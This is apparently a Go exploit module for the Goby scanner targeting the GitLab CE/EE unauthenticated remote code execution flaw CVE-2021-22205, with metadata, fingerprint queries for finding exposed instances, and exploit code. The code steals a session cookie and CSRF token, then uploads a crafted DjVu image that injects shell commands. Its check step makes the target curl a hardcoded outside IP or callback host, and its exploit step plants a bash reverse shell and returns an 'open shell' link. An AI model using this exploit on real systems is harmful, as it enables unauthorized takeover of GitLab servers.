package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "GitLab CE/EE Unauthenticated RCE (CVE-2021-22205)",
    "Description": "<p>GitLab is an open source project for a warehouse management system. It uses Git as a code management tool and builds a web service on this basis.</p><p>An issue has been discovered in GitLab CE/EE that affects all versions starting from 11.9. GitLab did not correctly validate the image file passed to the file parser, which resulted in remote command execution. An attacker can take over server permissions.</p>",
    "Impact": "GitLab CE/EE Unauthenticated RCE (CVE-2021-22205)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://packages.gitlab.com/gitlab/\">https://packages.gitlab.com/gitlab/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "GitLab",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "GitLab 仓库管理系统未授权远程命令执行漏洞（CVE-2021-22205）",
            "Description": "<p>GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的Web服务。</p><p>GitLab CE/EE 中发现了一个问题，影响从 11.9 开始的所有版本。GitLab 没有正确验证传递给文件解析器的图像文件，这导致远程命令执行。攻击者可接管服务器权限。</p>",
            "Impact": "<p>GitLab CE/EE 中发现了一个问题，影响从 11.9 开始的所有版本。GitLab 没有正确验证传递给文件解析器的图像文件，这导致远程命令执行。攻击者可接管服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://packages.gitlab.com/gitlab/\">https://packages.gitlab.com/gitlab/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "GitLab",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "GitLab CE/EE Unauthenticated RCE (CVE-2021-22205)",
            "Description": "<p>GitLab is an open source project for a warehouse management system. It uses Git as a code management tool and builds a web service on this basis.</p><p>An issue has been discovered in GitLab CE/EE that affects all versions starting from 11.9. GitLab did not correctly validate the image file passed to the file parser, which resulted in remote command execution. An attacker can take over server permissions.</p>",
            "Impact": "GitLab CE/EE Unauthenticated RCE (CVE-2021-22205)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://packages.gitlab.com/gitlab/\">https://packages.gitlab.com/gitlab/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "GitLab",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(header=\"_gitlab_session\" || banner=\"_gitlab_session\" || body=\"gon.default_issues_tracker\" || body=\"content=\\\"GitLab Community Edition\\\"\" || title=\"Sign in · GitLab\" || body=\"content=\\\"GitLab \" || body=\"<a href=\\\"https://about.gitlab.com/\\\">About GitLab\" || body=\"class=\\\"col-sm-7 brand-holder pull-left\\\"\")",
    "GobyQuery": "(header=\"_gitlab_session\" || banner=\"_gitlab_session\" || body=\"gon.default_issues_tracker\" || body=\"content=\\\"GitLab Community Edition\\\"\" || title=\"Sign in · GitLab\" || body=\"content=\\\"GitLab \" || body=\"<a href=\\\"https://about.gitlab.com/\\\">About GitLab\" || body=\"class=\\\"col-sm-7 brand-holder pull-left\\\"\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://about.gitlab.com/",
    "DisclosureDate": "2021-10-27",
    "References": [
        "https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.9",
    "CVEIDs": [
        "CVE-2021-22205"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202104-1685"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "GitLab"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10232"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			foeye := "165.22.59.16"
			aaa := goutils.RandomHexString(16)
			foeyecheckUrl := foeye + "/api/v1/poc_scan/" + strings.ToLower(aaa)
			foeyecmd := "curl http://" + foeyecheckUrl
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			if isDomain {
				cmd = "ping -c 1 " + checkUrl
			}
			RandJpgName := goutils.RandomHexString(6)
			JpgHexStart, _ := hex.DecodeString("41542654464F524D000003AF444A564D4449524D0000002E81000200000046000000ACFFFFDEBF992021C8914EEB0C071FD2DA88E86BE6440F2C7102EE49D36E95BDA2C3223F464F524D0000005E444A5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F4247343400000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F7079726967687420225C0A22202E2071787B")
			JpgHexEnd, _ := hex.DecodeString("7D202E205C0A222062202229202920202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020")
			uri1 := `/users/sign_in`
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				Gitlab_Cookie := regexp.MustCompile("Set-Cookie: _gitlab_session=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
				fmt.Println(Gitlab_Cookie[1])
				Csrf_Token := regexp.MustCompile("name=\"csrf-token\" content=\"(.*?)\" />").FindStringSubmatch(resp1.RawBody)
				fmt.Println(Csrf_Token[1])
				uri2 := `/uploads/user`
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("X-Csrf-Token", Csrf_Token[1])
				cfg2.Header.Store("X-Requested-With", "XMLHttpRequest")
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryxtxB7nI0mjqg3VoV")
				cfg2.Header.Store("Cookie", "_gitlab_session="+Gitlab_Cookie[1])
				cfg2.Data = fmt.Sprintf(`------WebKitFormBoundaryxtxB7nI0mjqg3VoV
Content-Disposition: form-data; name="file"; filename="%s.jpg"
Content-Type: image/jpeg
%s%s%s
------WebKitFormBoundaryxtxB7nI0mjqg3VoV--`, RandJpgName, string(JpgHexStart), foeyecmd, string(JpgHexEnd))
				httpclient.DoHttpRequest(u, cfg2)
				u3 := httpclient.NewFixUrl(foeye + ":80")
				cfg3 := httpclient.NewGetRequestConfig("/api/v1/poc_scan/get_result?filter=" + strings.ToLower(aaa))
				resp3, _ := httpclient.DoHttpRequest(u3, cfg3)
				if resp3.StatusCode == 200 && strings.Contains(resp3.Utf8Html, "ok") && strings.Contains(resp3.Utf8Html, "time") && strings.Contains(resp3.Utf8Html, "content") {
					return true
				}
				cfg2.Data = fmt.Sprintf(`------WebKitFormBoundaryxtxB7nI0mjqg3VoV
Content-Disposition: form-data; name="file"; filename="%s.jpg"
Content-Type: image/jpeg
%s%s%s
------WebKitFormBoundaryxtxB7nI0mjqg3VoV--`, RandJpgName, string(JpgHexStart), cmd, string(JpgHexEnd))
				httpclient.DoHttpRequest(u, cfg2)
				return godclient.PullExists(checkStr, time.Second*15)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			RandJpgName := goutils.RandomHexString(6)
			JpgHexStart, _ := hex.DecodeString("41542654464F524D000003AF444A564D4449524D0000002E81000200000046000000ACFFFFDEBF992021C8914EEB0C071FD2DA88E86BE6440F2C7102EE49D36E95BDA2C3223F464F524D0000005E444A5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F4247343400000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F7079726967687420225C0A22202E2071787B")
			JpgHexEnd, _ := hex.DecodeString("7D202E205C0A222062202229202920202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020")
			uri1 := `/users/sign_in`
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				Gitlab_Cookie := regexp.MustCompile("Set-Cookie: _gitlab_session=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
				fmt.Println(Gitlab_Cookie[1])
				Csrf_Token := regexp.MustCompile("name=\"csrf-token\" content=\"(.*?)\" />").FindStringSubmatch(resp1.RawBody)
				fmt.Println(Csrf_Token[1])
				uri2 := `/uploads/user`
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("X-Csrf-Token", Csrf_Token[1])
				cfg2.Header.Store("X-Requested-With", "XMLHttpRequest")
				cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryxtxB7nI0mjqg3VoV")
				cfg2.Header.Store("Cookie", "_gitlab_session="+Gitlab_Cookie[1])
				if ss.Params["AttackType"].(string) == "goby_shell_linux" {
					waitSessionCh := make(chan string)
					if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
						log.Println("[WARNING] godclient bind failed", err)
					} else {
						payload := godclient.ReverseTCPByBash(rp)
						cfg2.Data = fmt.Sprintf(`------WebKitFormBoundaryxtxB7nI0mjqg3VoV
Content-Disposition: form-data; name="file"; filename="%s.jpg"
Content-Type: image/jpeg
%s%s%s
------WebKitFormBoundaryxtxB7nI0mjqg3VoV--`, RandJpgName, string(JpgHexStart), payload, string(JpgHexEnd))
						go httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
						select {
						case webConsleID := <-waitSessionCh:
							log.Println("[DEBUG] session created at:", webConsleID)
							if u, err := url.Parse(webConsleID); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							}
						case <-time.After(time.Second * 15):
						}
					}
				}
			}
			return expResult
		},
	))
}
